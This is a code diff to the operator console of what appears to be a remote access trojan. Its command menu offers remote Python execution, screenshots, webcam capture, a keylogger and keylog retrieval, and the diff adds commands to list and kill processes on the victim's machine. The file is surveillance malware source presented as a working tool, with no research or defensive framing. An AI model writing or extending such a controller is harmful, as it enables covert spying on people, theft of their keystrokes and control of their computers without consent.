@@ -1,3 +1,4 @@
+import os
 import threading
 import logging
 from queue import Empty
@@ -13,6 +14,8 @@ python | Open Remote Python Interpreter
 screenshot | Grab a screenshot
 webcam | Capture webcam
 info | User Info
+ps | List running processes
+kill (pid) | Kill a process by PID
 keylogger (start) (stop) (status) | Manage Keylogger
 log | Returns log from client (includes keylogs)
 send | Transfers file to Client
@@ -87,7 +90,7 @@ class ServerCLI(Server):
         # returns None
         print('CAUTION! Using this feature wrong can break the client until restarted.')
         print('Tip: help("modules") lists available modules')
-        while 1:
+        while True:
             command = input('>>> ')
             if command in ['exit', 'exit()']:
                 break
@@ -104,7 +107,7 @@ class ServerCLI(Server):
         system, home, user = client.get_info()
         hostname = client.address[-1]
 
-        while 1:
+        while True:
             cwd = client.get_cwd()
             if not system == 'Windows':
                 cwd = cwd.replace(home, '~')
@@ -153,6 +156,66 @@ class ServerCLI(Server):
                 print('Webcam Capture Error')
         elif command == 'info':
             client.info()
+        elif command == 'ps':
+            processes = client.ps()
+
+            # Put process data in a readable format
+            longest_pid = 0
+            longest_cmdline = 0
+            longest_username = 0
+
+            data = []
+
+            for process in processes:
+                pid = f"{process['pid']}"
+                username = process['username']
+                cmdline = ' '.join(process['cmdline'])
+                if cmdline == '':
+                    cmdline = process['name']
+
+                data.append([pid, username, cmdline])
+
+                if len(pid) > longest_pid:
+                    longest_pid = len(pid)
+                if len(username) > longest_username:
+                    longest_username = len(username)
+                if len(cmdline) > longest_cmdline:
+                    longest_cmdline = len(cmdline)
+
+            print(f'{" "*4}PID {6*" "}User Command')
+
+            terminal_width = int(str(os.get_terminal_size()).split('=')[-2].split(',')[0])
+
+            max_command_length = terminal_width - 19
+            if max_command_length < 8:
+                max_command_length = 8
+
+            for process in data:
+                if len(process[0]) > 7:
+                    pid = f' {process[0][:7]}'
+                else:
+                    pid = f'{(7 - len(process[0])) * " "} {process[0]}'
+                if len(process[1]) > 9:
+                    username = f' {process[1][:9]} '
+                else:
+                    username = f'{(9 - len(process[1]))*" "} {process[1]} '
+                if len(process[2]) > max_command_length:
+                    cmdline = process[2][:max_command_length]
+                else:
+                    cmdline = f'{process[2]}'
+                print(f'{pid}{username}{cmdline}')
+
+        elif command[:4] == 'kill':
+            try:
+                pid = int(select.strip())
+            except (TypeError, ValueError):
+                print('Invalid PID')
+            else:
+                error = client.kill(pid)
+                if error:
+                    print(error)
+                else:
+                    print(f'Killed pid {pid}')
         elif command == 'keylogger':
             if select == 'start':
                 if client.start_keylogger():
